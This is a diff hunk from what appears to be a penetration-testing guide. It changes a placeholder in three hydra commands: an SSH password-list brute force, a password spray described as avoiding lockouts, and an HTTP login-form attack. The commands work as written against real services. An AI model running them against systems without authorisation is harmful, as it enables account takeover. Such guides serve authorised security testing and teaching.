@@ -34,19 +34,19 @@ SSH with a known user and a password list:
 
 ```bash
 hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/top-100.txt \
-  -t 4 -f ssh://TARGET
+  -t 4 -f ssh://HOST
 ```
 
 A password spray: one password across many users (quieter, avoids lockouts):
 
 ```bash
-hydra -L users.txt -p 'Winter2026!' -t 4 ssh://TARGET
+hydra -L users.txt -p 'Winter2026!' -t 4 ssh://HOST
 ```
 
 HTTP POST login form (the `^USER^`/`^PASS^` markers and a failure string):
 
 ```bash
-hydra -L users.txt -P passwords.txt TARGET \
+hydra -L users.txt -P passwords.txt HOST \
   http-post-form "/login:username=^USER^&password=^PASS^:Invalid credentials"
 ```
 
